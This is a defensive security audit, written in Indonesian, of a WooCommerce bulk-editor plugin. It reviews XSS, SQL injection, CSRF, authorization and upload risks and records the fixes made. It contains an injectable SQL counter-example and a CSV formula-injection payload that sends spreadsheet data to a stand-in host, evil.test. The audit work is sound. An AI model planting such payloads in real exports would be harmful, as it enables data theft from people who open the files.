# Model Ancaman

Audit kelas kerentanan: XSS, SQL injection, CSRF, otorisasi, dan file upload.

[SECURITY.md](SECURITY.md) berisi **aturan menulis kode aman**. Dokumen ini
berisi **hasil pemeriksaan menyeluruh** terhadap kode yang ada — apa yang aman,
kenapa aman, dan apa yang masih terbuka.

Diaudit 2026-07-30 terhadap v3.11.0, ditinjau ulang pada v3.12.0.

---

## Ringkasan

| Kelas | Status | Catatan |
|---|---|---|
| SQL injection | ✅ **tidak mungkin** | nol `$wpdb` — tidak ada query mentah |
| File upload | ✅ **tidak mungkin** | nol `$_FILES` — tidak ada upload |
| CSRF | ✅ terjaga | 14/14 handler memanggil `guard()` |
| Otorisasi | ✅ terjaga | edit dan hapus sama-sama dicek per objek (v3.11) |
| XSS | ✅ terjaga | seluruh titik render di-escape (v3.11) |

Dua kelas teratas aman **secara struktural**, bukan karena hati-hati. Itu
posisi terkuat: tidak ada cara untuk salah kalau permukaan serangannya tidak
ada.

---

## 1. XSS

### 1.1 Yang sudah benar

Server mengirim data produk sebagai JSON, JS merender ke HTML lewat string
concatenation. Setiap nilai dari server melewati helper:

```js
esc(t)      // createTextNode — untuk isi elemen
escAttr(t)  // escape & " < > — untuk nilai atribut
```

Diperiksa: seluruh renderer di objek `R`, `renderEditableCell()`,
`renderTextareaCell()`, `renderSelectCell()`, `renderBoolCell()`, dan
`showNotice()` — **semuanya meng-escape**.

Tiga bug di renderer `tax_class`/`shipping_class` sudah diperbaiki di v3.11
(lihat [SECURITY.md §9.2](SECURITY.md#92-xss-pada-dropdown-tax-class--shipping-class--sudah-diperbaiki)).

Sisi PHP: `views/admin-page.php` memakai `esc_html_e()` / `esc_attr_e()` di
seluruh 91 titik output.

### 1.2 Terbuka: label kolom di modal Columns

`admin.js:1328`:

```js
list.append(
    '<div class="wc-bulk-column-item" data-column="' + key + '">…' +
    col.label +          // ← tanpa escape
    '</span>…'
);
```

`col.label` berasal dari `WCB.all_columns`, yang diisi dari `const COLUMNS` di
PHP — **nilai hardcoded developer**, bukan input user.

**Tidak dapat dieksploitasi saat ini.** Tapi ini rapuh: kalau suatu saat label
kolom dibuat dapat difilter (`apply_filters('wcbulk_columns', …)`) agar plugin
lain bisa menambah kolom, jalur ini langsung menjadi XSS.

Perbaikan satu baris:
```js
s.esc(col.label)
```

`key` juga tidak di-escape, tapi divalidasi di sisi PHP lewat
`array_intersect()` dengan `array_keys(self::COLUMNS)` — nilai karangan tidak
akan pernah sampai.

### 1.3 Terbuka: label header tabel

`admin.js:927-931`:

```js
var lab = L[c] || c;
row.append('<th class="manage-column column-' + c + '">' + lab + '</th>');
```

`L` adalah objek literal berisi label hardcoded di JS. Fallback `|| c` memakai
nama kolom, yang berasal dari `getActiveColumns()` → `WCB.columns` → user meta
`_wcbulk_columns`.

User meta itu **ditulis user**, tapi disaring di PHP:

```php
$columns = array_values(array_intersect($requested, array_keys(self::COLUMNS)));
```

Hanya nama kolom yang dikenal yang tersimpan. Jadi `c` tidak bisa berisi HTML.

**Aman, tapi bergantung pada filter di tempat lain.** Kalau `wc_bulk_save_columns()`
diubah dan filternya dilonggarkan, ini jadi XSS. Escape defensif tetap lebih
baik.

### 1.4 Yang aman karena jQuery

```js
$filter.append($('<option>', { value: c.id, text: c.name }));
```

Properti `text` pada objek jQuery menyetel `textContent`, bukan `innerHTML`.
Nama kategori dengan `<script>` akan tampil sebagai teks. **Ini aman** —
berbeda dari `.html()` atau string concatenation.

Pola ini dipakai di `fillCategoryFilter()`, `fillTaxClasses()`,
`fillShippingClasses()`, dan dua tempat lain. Pertahankan.

### 1.5 Kenapa `esc()` aman

```js
esc: function (t) {
    if (!t) return '';
    var d = document.createElement('div');
    d.appendChild(document.createTextNode(String(t)));
    return d.innerHTML;
}
```

Browser yang melakukan escaping, bukan regex buatan sendiri. Ini benar dan
tidak bisa dilewati.

`escAttr()` memakai regex, tapi menutup keempat karakter yang penting
(`&`, `"`, `<`, `>`). Karena semua atribut di kode ini memakai kutip ganda,
itu memadai.

> **Catatan:** `escAttr()` tidak meng-escape kutip tunggal. Kalau nanti ada
> atribut yang ditulis `value='...'`, escape ini tidak cukup. Pertahankan
> konvensi kutip ganda.

---

## 2. SQL Injection

**Tidak mungkin terjadi.** Nol kemunculan `$wpdb` di seluruh plugin.

Semua akses data lewat API WordPress dan WooCommerce yang sudah menyiapkan
statement sendiri:

| Operasi | API |
|---|---|
| Query produk | `wc_get_products()` |
| Baca produk | `wc_get_product()` |
| Tulis produk | `$product->set_*()` + `save()` |
| Term | `get_terms()`, `wp_get_object_terms()`, `wp_set_post_terms()` |
| User meta | `get_user_meta()`, `update_user_meta()` |
| Buat term | `wp_insert_term()` |

Ini bukan kebetulan — ini konsekuensi
[ADR 0006](adr/0006-tanpa-tabel-kustom.md) (tanpa tabel kustom). Tanpa tabel
sendiri, tidak ada alasan menulis SQL.

### Kalau suatu saat `$wpdb` diperlukan

```php
// ❌ Injectable
$wpdb->get_results("SELECT * FROM {$wpdb->posts} WHERE post_title LIKE '%$search%'");

// ✅ Prepared
$wpdb->get_results($wpdb->prepare(
    "SELECT ID, post_title FROM {$wpdb->posts}
     WHERE post_type = %s AND post_title LIKE %s LIMIT %d",
    'product',
    '%' . $wpdb->esc_like($search) . '%',
    100
));
```

Tiga hal:

- **Nama tabel dari properti `$wpdb`**, jangan hardcode `wp_posts` — prefix bisa
  berbeda.
- **`esc_like()` sebelum `%s`** untuk pencarian LIKE, atau `%` dan `_` dalam
  input diperlakukan sebagai wildcard.
- **Nama tabel dan kolom tidak bisa di-`prepare()`.** Kalau dinamis, validasi
  dengan whitelist.

`prepare()` dengan placeholder yang tidak cocok jumlahnya menghasilkan
peringatan dan query kosong — bukan query berbahaya. Tapi tetap periksa.

---

## 3. CSRF

### 3.1 Cakupan

Diperiksa: **14 dari 14** handler AJAX memanggil `$this->guard()` sebagai
pernyataan pertama.

```php
private function guard(): void
{
    check_ajax_referer(self::NONCE, 'nonce');   // mati kalau nonce salah

    if (!current_user_can(self::CAPABILITY)) {
        wp_send_json_error(['message' => …], 403);
    }
}
```

`check_ajax_referer()` menghentikan eksekusi sendiri saat nonce tidak valid —
tidak perlu memeriksa nilai kembaliannya.

### 3.2 Kenapa nonce saja tidak cukup

Nonce menjawab *"apakah request ini berasal dari halaman kita?"* — bukan
*"apakah user ini boleh?"*.

Subscriber yang login juga menerima nonce valid kalau ia bisa membuka halaman
yang menghasilkannya. Karena itu `guard()` melakukan keduanya dan tidak boleh
dipecah.

### 3.3 Umur nonce

Nonce WordPress berlaku **12–24 jam**. Halaman Bulk Editor yang dibiarkan
terbuka semalaman akan menghasilkan kegagalan simpan keesokan harinya.

Kegagalan itu dulu muncul sebagai error generik. `failMessage()` kini
mengenali respons `403` dan `-1`, lalu menampilkan pesan sesi kedaluwarsa
dengan saran memuat ulang halaman. Kedua handler `.fail()` memakainya.

Bukan masalah keamanan — masalah pengalaman pakai.

---

## 4. Otorisasi

Bagian dengan temuan terbanyak.

### 4.1 Dasar

`manage_woocommerce` dimiliki **Administrator dan Shop Manager**. Semua
pemeriksaan di bawah harus dibaca dengan asumsi: *penyerang adalah Shop Manager
yang sah, mencoba melakukan lebih dari yang seharusnya.*

### 4.2 Asimetri: hapus dicek per objek, edit tidak

**Hapus dan trash** memeriksa per produk, di dalam loop:

```php
'trash'  => current_user_can('delete_post', $id) && (bool) wp_trash_post($id),
'delete' => current_user_can('delete_post', $id) && (bool) wp_delete_post($id, true),
```

Ini benar — capability per-objek menghormati kepemilikan post dan filter dari
plugin lain.

**Edit sebelum v3.11 tidak memeriksa apa pun** — siapa pun dengan
`manage_woocommerce` dapat mengubah produk mana pun dengan mengirim ID
langsung, termasuk yang di luar hasil filter yang ia lihat.

Pada WordPress standar itu konsisten: `manage_woocommerce` memang menyiratkan
kendali penuh atas katalog. Yang menjadi masalah adalah instalasi dengan plugin
multivendor (Dokan, WCFM) atau pembatasan peran kustom, di mana vendor hanya
boleh menyunting produknya sendiri.

**Ditutup di v3.11:**

```php
if (!current_user_can('edit_post', $pid)) {
    $errors[] = sprintf(
        __('#%1$d %2$s: permission denied.', 'bulk-product-editor-for-woocommerce'),
        $pid,
        $product->get_name(),
    );

    continue;
}
```

Produk yang ditolak masuk ke `$errors` dan dilaporkan ke klien — bukan
diabaikan diam-diam. User tahu perubahannya tidak tersimpan.

### 4.3 `duplicate` — sudah dicek per objek

Sebelumnya cabang ini satu-satunya di `bulk_action()` tanpa pemeriksaan per
objek. Risikonya rendah — menggandakan membuat objek baru dan tidak merusak
yang lama — tapi vendor tetap tidak seharusnya menyalin produk vendor lain.

```php
'duplicate' => current_user_can('read_post', $id)
    && (bool) (new WC_Admin_Duplicate_Product())->product_duplicate($product),
```

Ketiga cabang kini simetris: `read_post` untuk menyalin, `delete_post` untuk
trash dan delete.

### 4.4 `quick_add` — capability yang salah

```php
public function wc_bulk_quick_add(): void
{
    $this->guard();          // manage_woocommerce
    // …
    $product = new WC_Product_Simple();
    $product->save();        // membuat produk baru
}
```

Membuat produk seharusnya memerlukan `publish_products` atau `edit_products`,
bukan `manage_woocommerce`. Pada peran standar keduanya beririsan, jadi tidak
ada dampak praktis sekarang.

### 4.5 Yang sudah benar

`wc_bulk_create_category()` menambahkan pemeriksaan di atas `guard()`:

```php
if (!current_user_can('manage_product_terms')) {
    wp_send_json_error(['message' => …], 403);
}
```

Ini pola yang benar: `guard()` dulu, lalu capability khusus.

### 4.6 `render_admin_page()` — sudah dicek

Capability di `add_submenu_page()` hanya menyembunyikan item menu; halaman tetap
dapat dibuka lewat `?page=bulk-product-editor-for-woocommerce`. Dulu itu tidak membocorkan apa pun —
halaman hanya markup kosong dan semua data lewat AJAX yang dijaga — tapi
lapisan kedua tetap benar:

```php
if (!current_user_can(self::CAPABILITY)) {
    wp_die(esc_html__('You are not allowed to access this page.', 'bulk-product-editor-for-woocommerce'));
}
```

Terverifikasi lewat pengujian peran: subscriber menerima HTTP 403 dan
`window.WCBulkEditor` tidak pernah dimuat.

Lihat [ADMIN-UI.md §1](ADMIN-UI.md#capability-bukan-pengaman).

---

## 5. File Upload

**Tidak ada permukaan serangan.** Nol `$_FILES`, nol `wp_handle_upload()`,
nol `move_uploaded_file()`.

Export CSV berjalan ke arah sebaliknya — server menghasilkan string, browser
mengunduh:

```php
wp_send_json_success([
    'csv'      => implode("\n", $rows) . "\n",
    'filename' => 'bulk-export-' . wp_date('Y-m-d-His') . '.csv',
]);
```

Tidak ada file yang ditulis ke disk. Nama file dibuat server, bukan dari input
user.

### Risiko yang tetap ada: formula injection

Sudah ditangani (`csv_cell()`, baris 985) — lihat
[SECURITY.md §8](SECURITY.md#8-formula-injection-pada-csv).

Ini kerentanan pada **aplikasi yang membuka file**, bukan pada WordPress.
Nama produk seperti `=HYPERLINK("http://evil.test?d="&A1,"Klik")` akan
dieksekusi Excel.

### Kalau nanti ada impor CSV

Pola aman ada di [ADMIN-UI.md §4](ADMIN-UI.md#file-upload). Yang paling penting:

```php
$file = wp_handle_upload($_FILES['csv'], [
    'test_form' => false,
    'mimes'     => ['csv' => 'text/csv'],   // ← whitelist, wajib
]);
```

Tanpa `mimes`, file apa pun bisa masuk folder uploads — termasuk `.php`.

Dan saat membaca: **jangan percaya isi CSV.** Setiap sel harus melewati
sanitasi yang sama dengan input form, dan ID produk harus diverifikasi
kepemilikannya.

---

## 6. Permukaan Serangan Ringkas

Apa yang terpapar dan siapa yang bisa menyentuhnya:

| Titik masuk | Akses minimum | Terjaga oleh |
|---|---|---|
| 14 endpoint `wp_ajax_wc_bulk_*` | login + `manage_woocommerce` | `guard()` |
| Halaman `?page=bulk-product-editor-for-woocommerce` | login | menu capability (markup kosong) |
| Aset `assets/*.js`, `*.css` | publik | statis, tanpa data |

**Tidak ada endpoint `wp_ajax_nopriv_*`.** Tidak ada satu pun jalur yang dapat
disentuh pengunjung tanpa login. Ini mempersempit permukaan serangan secara
drastis.

Sebelum v3.11, ada satu jalur tanpa login: 47 file `.bak` yang dapat dibaca
lewat URL. Sudah dipindah ke luar webroot
([SECURITY.md §9.1](SECURITY.md#91-file-backup-dapat-diakses-publik--sudah-diatasi)).

---

## 7. Daftar Perbaikan

Sudah dikerjakan di v3.11.0:

- [x] **`current_user_can('edit_post', $pid)` di `wc_bulk_save_inline()`** —
      asimetri 4.2 ditutup. Produk yang ditolak dilaporkan ke klien sebagai
      error per-item, bukan diabaikan diam-diam.
- [x] **`B.esc(col.label)` dan `B.escAttr(key)` di modal Columns** (1.2)
- [x] **Escape pada fallback label header tabel** (1.3) — `L[c]` sengaja
      dilewatkan karena `L.cb` berisi markup checkbox yang memang harus
      dirender; hanya fallback `c` yang di-escape.

- [x] **`current_user_can('read_post', $id)` untuk `duplicate`** (4.3) —
      menyamakan ketiga cabang `bulk_action` sehingga semuanya memeriksa
      capability per objek.
- [x] **Cek capability di `render_admin_page()`** (4.6) — halaman kini
      `wp_die()` untuk siapa pun tanpa `manage_woocommerce`, bukan hanya
      menyembunyikan item menu.
- [x] **Pesan khusus untuk nonce kedaluwarsa** (3.3) — `failMessage()`
      mengenali 403 dan `-1`, lalu menampilkan "sesi kedaluwarsa, muat ulang
      halaman" alih-alih error generik.

Tidak ada item terbuka yang tersisa di daftar ini.

---

## 8. Cara Mengaudit Ulang

Setelah perubahan besar, jalankan:

```bash
# Handler tanpa guard()
grep -n "public function wc_bulk_" bulk-product-editor-for-woocommerce.php

# Query mentah
grep -n '\$wpdb' bulk-product-editor-for-woocommerce.php

# Upload
grep -n '\$_FILES\|wp_handle_upload' bulk-product-editor-for-woocommerce.php

# Superglobal langsung
grep -nE '\$_(POST|GET|REQUEST)\[' bulk-product-editor-for-woocommerce.php

# Output JS tanpa escape
grep -nE "\.html\(|\.append\(|innerHTML" assets/admin.js | grep -v "esc("

# Endpoint tanpa login
grep -n "wp_ajax_nopriv" bulk-product-editor-for-woocommerce.php
```

Perintah terakhir harus selalu kosong.

---

## Rujukan

- [SECURITY.md](SECURITY.md) — aturan menulis kode aman
- [ADMIN-UI.md](ADMIN-UI.md) — pola form dan upload admin
- [ADR 0006](adr/0006-tanpa-tabel-kustom.md) — kenapa tidak ada SQL mentah
